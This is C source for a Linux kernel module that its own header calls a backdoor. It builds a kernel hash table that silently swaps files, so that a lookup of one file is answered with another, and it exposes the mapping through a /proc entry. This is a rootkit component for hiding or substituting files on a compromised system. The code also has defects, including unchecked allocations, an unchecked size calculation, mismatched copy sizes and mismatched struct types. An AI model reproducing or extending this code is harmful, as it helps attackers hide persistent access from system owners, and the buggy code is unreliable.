#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/rhashtable.h>
#include "bdoor_common.h"
#include "file_replace.h"


#ifdef CONFIG_X86_64

struct rhashtable_params replace_table_params = {
        .key_len = sizeof(struct dentry_identifier),
        .key_offset = offsetof(struct replace_entry,id),
        .head_offset = offsetof(struct replace_entry,node)
};

atomic_t replace_table_users;
struct rhashtable replace_table;
spinlock_t replace_table_lock;

static struct replace_entry *req_to_entry(struct replace_id *orig_id)
{
        struct replace_entry *ret = kmalloc(sizeof(struct replace_entry),GFP_ATOMIC);
        memcpy(&ret->id,&orig_id->orig,sizeof(struct replace_id));
	memcpy(&ret->rep,&orig_id->rep,sizeof(struct replace_id));
        return ret;
}

void replace_table_free_entry(void *ptr, void *arg)
{
	struct replace_entry *entry = (struct replace_entry*)ptr;
        kfree(entry);
}

static void add_replace_entry_to_table(struct replace_id *identifier)
{
        int err;
        struct replace_entry *new_entry = req_to_entry(identifier);
        atomic_inc(&replace_table_users);
	spin_lock(&replace_table_lock);

	err = rhashtable_lookup_insert_fast(&replace_table,
                                        &new_entry->node,
                                        replace_table_params);

        if (err)
                kfree(new_entry);

	spin_unlock(&replace_table_lock);
        atomic_dec(&replace_table_users);
}

int process_replace_request(struct replace_request *request)
{
        int i;
        int ret = 0;
        struct replace_id *entries = kmalloc(request->count *
                                                sizeof(struct replace_id),GFP_ATOMIC);
        if (copy_from_user(entries,(struct replace_id*)request->idents,
                                request->count * sizeof(struct replace_id))) {
                ret = 1;
                goto out;
        }
        for (i = 0; i < request->count; i++)
                add_replace_entry_to_table(&entries[i]);
out:
        kfree(entries);
        return ret;
}

static void rem_replace_entry_from_table(struct replace_id *old_id)
{
        struct replace_entry *old_entry;
        atomic_inc(&replace_table_users);
	spin_lock(&replace_table_lock);
        old_entry = rhashtable_lookup_fast(&replace_table,
                                        &old_id->orig,
                                        replace_table_params);
        if (!old_entry)
                goto out;

        if (rhashtable_remove_fast(&replace_table,
				   &old_entry->node,
				   replace_table_params));
        kfree(old_entry);
out:
	spin_unlock(&replace_table_lock);
        atomic_dec(&replace_table_users);
}

int process_unreplace_request(struct replace_request *request)
{
        int i;
        int ret = 0;
        struct replace_id *entries = kmalloc(request->count *
					sizeof(struct replace_id),GFP_ATOMIC);
        if (copy_from_user(entries,(struct replace_id*)request->idents,
                                request->count * sizeof(struct replace_id))) {
                ret = 1;
                goto out;
        }
        for (i = 0; i < request->count; i++)
                rem_replace_entry_from_table(&entries[i]);
out:
        kfree(entries);
        return ret;
}

static int replace_proc_show(struct seq_file *p, void *v)
{
	struct rhashtable_iter iter;
	struct replace_id *rep_id;
	unsigned long flags;
	seq_printf(p,"%-*s%-*s%-*s\n",
		11,"DEVICE",
		21,"INODE",
		8,"NAME");
	spin_lock_irqsave(&replace_table_lock,flags);
	atomic_inc(&replace_table_users);
	rhashtable_walk_enter(&replace_table,&iter);
	rhashtable_walk_start(&iter);

	while((rep_id = rhashtable_walk_next(&iter)) != NULL)
	{
		rhashtable_walk_stop(&iter);
		seq_printf(p,"%-*u%-*lu%s\n",
			11,rep_id->orig.device,
			21,rep_id->orig.parent_ino,
			rep_id->orig.name);
		seq_printf(p,"%-*u%-*lu%s\n",
			11,rep_id->rep.device,
			21,rep_id->rep.parent_ino,
			rep_id->rep.name);
		seq_printf(p,"\n");
		rhashtable_walk_start(&iter);
	}

	rhashtable_walk_stop(&iter);
	rhashtable_walk_exit(&iter);
	atomic_dec(&replace_table_users);
	spin_unlock_irqrestore(&replace_table_lock,flags);
	return 0;
}


static int replace_proc_open(struct inode *inode,struct file *file)
{
        return single_open(file,replace_proc_show,NULL);
}

const struct proc_ops replace_ops = {
        .proc_open = replace_proc_open,
        .proc_read = seq_read,
        .proc_release = single_release,
};

struct proc_dir_entry *replaced_file_viewer;

#endif
